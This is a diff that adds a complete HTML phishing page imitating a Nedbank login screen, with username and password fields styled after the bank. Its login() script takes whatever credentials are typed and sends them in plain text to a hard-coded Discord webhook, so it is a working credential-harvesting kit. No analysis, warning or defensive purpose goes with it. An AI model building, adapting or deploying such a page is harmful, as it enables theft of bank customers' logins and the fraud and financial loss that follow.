@@ -1,0 +1,100 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nedbank Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #008000; /* Green background */
+            color: #FFFFFF; /* White text */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #FFFFFF; /* White background for the container */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #008000;
+            border-radius: 5px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #008000;
+            color: #FFFFFF;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .login-container button:hover {
+            background-color: #006600;
+        }
+        @keyframes androidKeystroke {
+            0% { transform: scale(1); }
+            50% { transform: scale(0.98); }
+            100% { transform: scale(1); }
+        }
+        @keyframes iPhoneKeystroke {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(-2px); }
+            100% { transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Nedbank Login</h2>
+        <input type="text" id="username" placeholder="Username" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button onclick="login()">Login</button>
+    </div>
+
+    <script>
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1457481073922543637/ZucrulRGAUcUfEpc0Nyvod8-HxO0MezvpWlkjeOsrTd8BodQSBgMmOYGgke89fSXfiA6';
+
+            const data = {
+                content: `Username: ${username}\nPassword: ${password}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+
+            const button = document.querySelector('.login-container button');
+            button.style.animation = 'androidKeystroke 0.1s, iPhoneKeystroke 0.1s';
+        }
+    </script>
+</body>
+</html>
